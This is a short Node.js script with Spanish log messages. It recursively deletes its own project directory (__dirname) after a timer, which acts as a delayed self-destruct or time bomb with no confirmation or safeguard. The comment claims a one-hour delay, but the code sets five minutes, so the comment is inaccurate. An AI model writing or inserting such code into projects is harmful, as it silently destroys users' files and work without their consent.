const fs = require('fs');
const path = require('path');


function deleteFolderRecursive(folderPath) {
  if (fs.existsSync(folderPath)) {
    fs.readdirSync(folderPath).forEach((file) => {
      const curPath = path.join(folderPath, file);
      if (fs.lstatSync(curPath).isDirectory()) {

        deleteFolderRecursive(curPath);
      } else {

        fs.unlinkSync(curPath);
      }
    });

    fs.rmdirSync(folderPath);
    console.log(`Carpeta ${folderPath} eliminada.`);
  }
}


const projectPath = __dirname;


setTimeout(() => {
  console.log(`Eliminando proyecto en: ${projectPath}`);
  deleteFolderRecursive(projectPath);
},  5 * 60 * 1000); // 1 hora en milisegundos
